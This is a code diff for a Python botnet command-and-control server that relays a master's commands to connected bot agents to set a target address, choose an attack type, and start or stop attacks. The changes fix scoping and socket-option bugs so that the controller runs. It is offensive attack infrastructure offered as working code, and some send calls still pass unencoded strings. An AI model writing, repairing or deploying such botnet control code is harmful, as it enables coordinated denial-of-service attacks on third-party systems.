@@ -1,4 +1,3 @@
-from _typeshed import FileDescriptor
 from array import array
 import socket
 import sys
@@ -63,6 +62,9 @@ def iam_handler(sock: socket.socket, body: str) -> None:
 
 
 def master_handler(sock: socket.socket, type: str, body: str) -> None:
+    global attacking
+    global attk_type
+    global target_address
     if type == 'listbot':
         if len(bot_agents) == 0:
             sock.send(b'listbot: ')
@@ -74,12 +76,10 @@ def master_handler(sock: socket.socket, type: str, body: str) -> None:
     elif type == 'changeip':
         # TODO: check if valid ip/address
         bot_broadcast(bytes(f'changeip:{body}'))
-        global target_address
         target_address = body
     elif type == 'changattk':
         # TODO: check if valid attack
         bot_broadcast(bytes(f'changeattk:{body}'))
-        global attk_type
         attk_type = body
     elif type == 'startattk':
         if not target_address:
@@ -90,7 +90,6 @@ def master_handler(sock: socket.socket, type: str, body: str) -> None:
             sock.send(b'startattk:error:already attacking')
         else:
             bot_broadcast(b'startattk:True')
-            global attacking
             attacking = True
             sock.send('startattk:success:started attack')
     elif type == 'stopattk':
@@ -98,7 +97,6 @@ def master_handler(sock: socket.socket, type: str, body: str) -> None:
             sock.send(b'stopattk:error:no attack in progress')
         else:
             bot_broadcast(b'stopattk:True')
-            global attacking
             attacking = False
             sock.send('stopattk:success:stopped attack')
     else:
@@ -115,6 +113,7 @@ def bot_broadcast(message: bytes) -> None:
 
 
 def disconnect_wrapper(sock: socket.socket) -> None:
+    global master_client
     socket_list.remove(sock)
     sock_addr = repr(sock.getsockname())
 
@@ -128,7 +127,6 @@ def disconnect_wrapper(sock: socket.socket) -> None:
         print(f'bot agent {sock_addr} disconnected')
     # master client disconnect
     else:
-        global master_client
         master_client = None
         print(f'master client {sock_addr} disconnected')
 
@@ -140,7 +138,7 @@ if __name__ == "__main__":
 
     host, port = sys.argv[1], int(sys.argv[2])
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR)
+    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server_socket.bind((host, port))
     server_socket.listen()
     socket_list.append(server_socket)
